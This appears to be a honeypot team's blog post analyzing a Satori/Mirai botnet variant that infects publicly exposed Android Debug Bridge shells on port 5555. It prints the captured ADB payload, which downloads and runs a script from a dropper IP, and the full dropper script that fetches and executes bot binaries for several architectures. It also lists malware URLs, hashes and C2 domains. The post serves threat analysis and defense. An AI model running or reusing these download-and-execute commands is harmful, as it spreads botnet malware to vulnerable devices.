---
title: Satori/Mirai botnet detected
description: Variant of Satori/Mirai detected attacking public available ADB shells
header: Variant of Satori/Mirai detected attacking public available ADB shells
---

On the 10th of July at 23:30 UTC we noticed an increased traffic on our [blackhole monitoring](http://sicherheitstacho.eu/start/main) on TCP port 5555. Upon further analysis, we saw a big chunk of this traffic coming from China, USA and the Dominican Republic. In total we gathered **246.434 packets** from **68.361 unique IPs**. Based on the packet details we gathered, we can assume that the packets were generated by a lot of different devices. In addition, the traffic behavior on port 5555 matches the typicall scan behavior of botnets.

<!--more-->

![]({{"/assets/images/adb-botnet-g1.png"|absolute_url}})

### Inspecting the payload and stumbling on old friends

The payload registered and captured by out T-Pot honeypots (35.204) looks like this:

```
CNXN 2 host::OPEN ]+shell:>/sdcard/Download/f && cd /sdcard/Download/;
>/dev/f && cd /dev/; busybox wget http://95.215.62.169/adbs -O -> adbs; sh adbs; rm adbs
```

The first chars of this payload are Android Debug Bridge (ADB) commands, used for initiating a connection to a debug channel. This connection is then used to execute a shell command.

Let's examine the command:

```
>/sdcard/Download/f && cd /sdcard/Download/;
```

Short shell builtin for clearing (or touching) the file `>/sdcard/Download/f` and changing to this folder.

```
>/dev/f && cd /dev/;
```

Same as above, just with a different file (and folder).

```
busybox wget http://95.215.62.169/adbs -O -> adbs; sh adbs; rm adbs
```

Download `adbs` from dropper server, execute it and remove it. The `rm` is used to cover up tracks and only keep the bot/malware in memory.

Searching for this IP reveals it was already [detected some time ago](http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/) in correlation to the Satori botnet.

### Analyzing the dropped file

The downloaded `adbs` shellscript looks like this:

``` 
#!/bin/sh

n="arm.bot.le mips.bot.be mipsel.bot.le arm7.bot.le x86_64.bot.le i586.bot.le i686.bot.le"
http_server="95.215.62.169"

for a in $n
do
    cp /system/bin/sh $a
    >$a
    busybox wget http://$http_server/adb/$a -O -> $a
    chmod 777 $a
    ./$a
done

for a in $n
do
    rm $a
done
```

This is a simple script to download the malware compiled for different architectures and execute them (all one by one). Dirty approach -- but works.

### Another variant of Satori?

Having a deeper look at the downloaded binaries, this looks like another modified version of Mirai or Satori, adjusted to exploit public available ADB devices. Heading over to VirusTotal, only five engines detect this binary (ELF;Mira-RQ) until now. First date of detection: 2018-07-09 09:20.

![]({{"/assets/images/adb-botnet-vt.png"|absolute_url}})

We can find the same `table_unlock` function mentioned in the [previous linked blog article](http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/), indicating a variant or at least code shared between the two. Compare this screenshot from the blog post:

![]({{"/assets/images/adb-botnet-tableUnlock2-360.png"|absolute_url}})

With what we can find in the new binary:

![]({{"/assets/images/adb-botnet-tableUnlock2.png"|absolute_url}})

As usualy seen in a Mirai bot, strings are "encrypted" with a simple XOR. Decrypting with `0x31` leads to the following results:

```
LOLNOGTFO – kills bot [1]
KILLATTK - kills any ongoing attacks [1]
GETSPOOFS - ???
GAYFGT – sth. reporting related? [1]
```

And the following domains:
```
i.rippr.cc -> 95.215.62.169 (TXT record)
p.rippr.cc -> 180.101.204.161 (TXT record)
```

[1] Similar commands found [here](http://dosattack.net/2015/09/13/Is-your-router-part-of-a-botnet.html) on a  blog.

## Files

```
1. http://95.215.62.169/i686.bot.le - 1eddee13762d7996c02b4c57fa3f8ffc
2. http://95.215.62.169/arm.bot.le - d01f194c374eebb9235291e34bc0d185
3. http://95.215.62.169/arm7.bot.le - d10c1591aee800a5f37f654f1ecd20a8
4. http://95.215.62.169/x86_64.bot.le - 4e4fc7e7599e5bd07e097a2f313486fe
5. http://95.215.62.169/mips.bot.be - a18b0d1401305588107e58054e6aa2ab
6. http://95.215.62.169/mipsel.bot.le - 9689cc9fe613b735fa1d386dffcdd6d8
7. http://95.215.62.169/i586.bot.le - 61f0bad58d28e73d1ef29b9574d28e41
```

## References

* [http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/](http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/)
* [http://dosattack.net/2015/09/13/Is-your-router-part-of-a-botnet.html](http://dosattack.net/2015/09/13/Is-your-router-part-of-a-botnet.html)
